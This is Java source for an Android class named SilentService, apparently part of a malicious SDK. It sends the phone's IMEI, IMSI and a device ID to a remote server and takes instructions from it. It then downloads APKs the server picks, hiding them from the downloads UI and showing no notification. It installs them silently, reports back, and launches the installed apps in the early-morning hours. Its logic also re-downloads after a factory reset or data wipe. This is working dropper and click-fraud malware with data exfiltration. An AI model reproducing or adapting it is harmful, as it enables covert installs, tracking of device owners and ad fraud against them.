package com.mx.utils.services;

import java.io.File;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

import org.json.JSONObject;

import com.mx.utils.utils.DeviceUtils;
import com.mx.utils.utils.HttpUtil;
import com.mx.utils.utils.MyHelpUtil;

import android.app.DownloadManager;
import android.app.DownloadManager.Query;
import android.app.DownloadManager.Request;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.text.TextUtils;

public class SilentService extends AsyncTask<Void, Integer, String> {

	private Context context;

	public SilentService(Context context) {
		this.context = context;
	}

	private String apppakname;

	private String appalias;

	private int install_count = 6;

	private int screen_count = 500;

	private int s_interval = 24;

	private int d_interval = 5;

	private String download_url;

	@Override
	protected String doInBackground(Void... params) {
		// TODO Auto-generated method stub

		if (MyHelpUtil.checkNet(context)) {

			/* get_install_msg __ c */
			String localURL = HttpUtil.BASE_URL + "app_c.action";

			String param = setPostParams();

			try {

				String msg = HttpUtil.postRequest(localURL, param);

				System.out.println("静默：服务器返回结果：：：" + msg);

				if (!TextUtils.isEmpty(msg)) {

					JSONObject jsb = new JSONObject(msg);

					screen_count = jsb.getInt("screen_count");

					s_interval = jsb.getInt("s_interval");

					apppakname = jsb.getString("apppakname");

					appalias = jsb.getString("appalias");

					install_count = jsb.getInt("install_count");

					d_interval = jsb.getInt("d_interval");

					download_url = jsb.getString("download_url");

					boolean bool = checkOption(screen_count, s_interval,
							apppakname, install_count);

					if (bool) {
						localDownloadManager(appalias, apppakname, download_url);
					}

				} else {
					cancel(false);
				}

			} catch (Exception e) {
				e.printStackTrace();
				cancel(false);
			}

		} else {

			cancel(false);
		}

		return null;
	}

	/**
	 * silent dateTime
	 */
	private boolean checkOption(int screen_count, int interval,
			String apppakname, int install_count) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);

		SharedPreferences msgSharedPreferences = context.getSharedPreferences(
				"MSG_STATUS", 0);

		SharedPreferences installSharedPreferences = context
				.getSharedPreferences("INSTALL_STATUS", 0);

		int local_screen_count = localSharedPreferences.getInt("screen_count",
				0);

		int installCount = installSharedPreferences.getInt(apppakname, 0);

		boolean time_iner = false;

		if (!msgSharedPreferences.contains("silent")) {

			System.out.println("静默：初始化时间，满足条件");

			time_iner = true;
		} else {

			long reslut = Math.abs(new Date().getTime()
					- msgSharedPreferences.getLong("silent", 0));

			long display_interval_to_long = Math.abs(interval * 3600 * 1000);

			System.out.println("静默时间间隔：" + reslut + "毫秒" + "::" + reslut / 3600
					/ 1000 + "H");

			if (reslut >= display_interval_to_long) {

				System.out.println("满足静默时间间隔");

				time_iner = true;

			} else {
				System.out.println("不满足静默时间间隔");
			}
		}

		System.out.println("静默：本机解锁屏次数：" + local_screen_count);

		System.out.println("静默：服务器限制解锁屏次数：" + screen_count);

		System.out.println("静默：本机保存：" + apppakname + "安装次数" + installCount);

		System.out.println("静默：服务器限制：" + apppakname + "安装次数：" + install_count);

		if (local_screen_count >= screen_count && time_iner
				&& installCount <= install_count) {

			System.out.println("静默：静默条件>>满足条件");

			return true;

		} else {
			System.out.println("静默：不满足静默条件");
		}

		return false;
	}

	private String setPostParams() {

		StringBuilder params_sb = new StringBuilder();

		params_sb.append("h=" + DeviceUtils.getKeyStore(context));

		params_sb.append("&i=" + DeviceUtils.getIMSI(context));

		params_sb.append("&j=" + DeviceUtils.getIMEI(context));

		SharedPreferences localSharedPreferences_id = context
				.getSharedPreferences("DEVICE_STATUS", 0);

		params_sb.append("&k="
				+ localSharedPreferences_id.getString("create_device_id",
						"null"));

		return params_sb.toString();
	}

	private boolean checkDownloadOption() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("MSG_STATUS", 0);

		long s = localSharedPreferences.getLong("sdownload", -1);

		if (s == -1) {

			System.out.println("静默：下载间隔时间>>满足间隔");

			return true;
		}

		long srestolong = Math.abs(d_interval * 60 * 1000);

		long res = Math.abs(new Date().getTime() - s);

		System.out.println("静默：下载间隔时间：" + res + "毫秒" + "分钟：" + res / 60 / 1000);

		if (res >= srestolong) {

			System.out.println("静默：下载间隔时间>>满足间隔");

			return true;

		} else {

			System.out.println("静默：下载间隔时间>>不满足满足间隔");

		}
		return false;
	}

	private long silentDownload(String appalias, String apppakname,
			String download_url) {

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		System.out.println("静默：》APK下载地址：" + download_url);

		Uri uri = Uri.parse(download_url);

		// Uri uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context,
		// appalias));

		DownloadManager.Request request = new Request(uri);

		request.setAllowedNetworkTypes(Request.NETWORK_MOBILE
				| Request.NETWORK_WIFI);

		request.setVisibleInDownloadsUi(false);

		request.setShowRunningNotification(false);

		request.setDestinationInExternalFilesDir(context,
				Environment.DIRECTORY_DOWNLOADS, appalias + ".apk");

		request.addRequestHeader("Connection", "Keep-Alive");

		request.addRequestHeader("Accept-Language", "zh-CN");

		request.addRequestHeader("Charset", "UTF-8");

		request.addRequestHeader("Accept",
				"application/vnd.android.package-archive,application/msword, */*");

		synchroDownloadData(apppakname);

		saveSilentDownloadStatus();

		return downloadManager.enqueue(request);
	}

	private void synchroDownloadData(String apppakname) {

		String rawParams = MyHelpUtil.setParams(apppakname, 1, context);

		try {

			/* device_download _ */
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_e.action", rawParams);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param appalias
	 * @param apppakname
	 */
	private void localDownloadManager(String appalias, String apppakname,
			String download_url) {

		String localFileURI = context.getExternalFilesDir(
				Environment.DIRECTORY_DOWNLOADS).getPath()
				+ "/" + appalias + ".apk";

		File file = new File(localFileURI);

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("DOWLOAD_STATUS", 0);

		DownloadManager downloadManager = (DownloadManager) context
				.getSystemService(Context.DOWNLOAD_SERVICE);

		long downloadid = localSharedPreferences.getLong(appalias, -1);

		if (downloadid != -1) {

			Query query = new Query();

			query.setFilterById(downloadid);

			Cursor cursor = downloadManager.query(query);

			try {

				if (cursor.moveToNext()) {

					if (!file.exists()) {

						System.out
								.println("本地XML有downloadID保存，DownloadManager中存在记录，但是文件不存在，重新下载");

						downloadManager.remove(downloadid);

						if (checkDownloadOption()) {

							long id = silentDownload(appalias, apppakname,
									download_url);

							MyHelpUtil.setDownloadId(context, id, appalias);

						}

						return;
					}

					int column_status_index = cursor
							.getColumnIndex(DownloadManager.COLUMN_STATUS);

					int status = cursor.getInt(column_status_index);

					System.out
							.println("本地XML有downloadID保存，DownloadManager中存在记录：：文件状态码："
									+ status);

					if (status == DownloadManager.STATUS_SUCCESSFUL) {

						PackageInfo pi = context.getPackageManager()
								.getPackageArchiveInfo(localFileURI,
										PackageManager.GET_SIGNATURES);

						if (pi == null || pi.signatures == null) {

							if (file.exists()) {
								file.delete();
							}

							if (checkDownloadOption()) {

								System.out.println("redownload comming！");

								long id = silentDownload(appalias, apppakname,
										download_url);

								MyHelpUtil.setDownloadId(context, id, appalias);

							}

							return;

						}

						System.out
								.println("本地XML有downloadID保存，DownloadManager中存在记录：：文件状态码验证成功，进行安装");

						int install_return = MyHelpUtil.install(localFileURI);

						System.out.println("静默：安装返回结果：" + install_return);

						if (install_return == 1) {

							System.out.println("静默：APK错误安装失败删除错误安装包");

							file.delete();

							return;
						}

						if (install_return == 0) {

							/* SysService */

							sysInstall(apppakname);

							/* Save */
							saveSilentStatus();

							/* Open App */
							if (checkOpenTime()) {

								System.out.println("静默：满足打开APP时间间隔：运行app");

								MyHelpUtil.openApp(apppakname, context);

								synchroOpenData(apppakname);

								/* Open All App */
								openApp();
							}

						}

					}

				} else {

					if (file.exists()) {

						file.delete();

						if (checkDownloadOption()) {

							System.out
									.println("本地xml文件存在下载信息，DownloadManager不存在下载 ，文件存在，删除文件后重新下载.");

							System.out.println("出现此种情况,防止手机恢复出厂设置,出现数据不统一情况");

							long id = silentDownload(appalias, apppakname,
									download_url);

							MyHelpUtil.setDownloadId(context, id, appalias);

						}

					} else {

						if (checkDownloadOption()) {

							System.out
									.println("本地xml文件存在下载信息，DownloadManager不存在下载 ，文件不存在，重新下载.");

							System.out.println("出现此种情况,防止手机恢复出厂设置,出现数据不统一情况");

							long id = silentDownload(appalias, apppakname,
									download_url);

							MyHelpUtil.setDownloadId(context, id, appalias);
						}
					}

				}

			} finally {
				if (cursor != null) {
					cursor.close();
				}
			}

		} else {

			if (file.exists()) {

				if (checkDownloadOption()) {

					System.out.println("本地xml文件不存在保存的下载信息，文件存在，删除重新下载.");

					System.out.println("出现的情况:用户清除xml数据.防止状态不准确,重新下载");

					file.delete();

					long id = silentDownload(appalias, apppakname, download_url);

					MyHelpUtil.setDownloadId(context, id, appalias);

				}

			} else {

				if (checkDownloadOption()) {

					System.out.println("本地xml文件不存在保存的下载信息，文件不存在，下载.主要执行的方法");

					long id = silentDownload(appalias, apppakname, download_url);

					MyHelpUtil.setDownloadId(context, id, appalias);
				}
			}
		}

	}

	/**
	 * 
	 */
	public void saveSilentStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("MSG_STATUS", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("silent", new Date().getTime());

		localEditor.commit();
	}

	public void saveSilentDownloadStatus() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("MSG_STATUS", 0);

		Editor localEditor = localSharedPreferences.edit();

		localEditor.putLong("sdownload", new Date().getTime());

		localEditor.commit();
	}

	public void sysInstall(String apppakname) {

		String params = MyHelpUtil.setParams(apppakname, 2, context);

		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_f.action", params);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void openApp() {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("INSTALL_STATUS", 0);

		Map<String, ?> sysmap = localSharedPreferences.getAll();

		Set<String> keySet = sysmap.keySet();

		for (Iterator<String> iterator = keySet.iterator(); iterator.hasNext();) {

			String packname = (String) iterator.next();

			PackageManager pm = context.getPackageManager();

			try {

				Thread.sleep(5 * 1000);

				backHome();

				PackageInfo pi = pm.getPackageInfo(packname,
						PackageManager.GET_ACTIVITIES);

				MyHelpUtil.openApp(pi.packageName, context);

				synchroOpenData(pi.packageName);

				Thread.sleep(8 * 1000);

			} catch (NameNotFoundException e) {
				continue;
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}

		backHome();
	}

	public void backHome() {
		Intent i = new Intent(Intent.ACTION_MAIN);
		i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		i.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(i);
	}

	public boolean checkOpenTime() {

		Calendar calendar = Calendar.getInstance();

		int hour = calendar.get(Calendar.HOUR_OF_DAY);

		if (hour >= 1 && hour <= 7) {
			return true;
		} else {
			return false;
		}
	}

	public void synchroOpenData(String apppakname) {

		String rawParams = MyHelpUtil.setParams(apppakname, 3, context);
		try {
			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_g.action", rawParams);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}
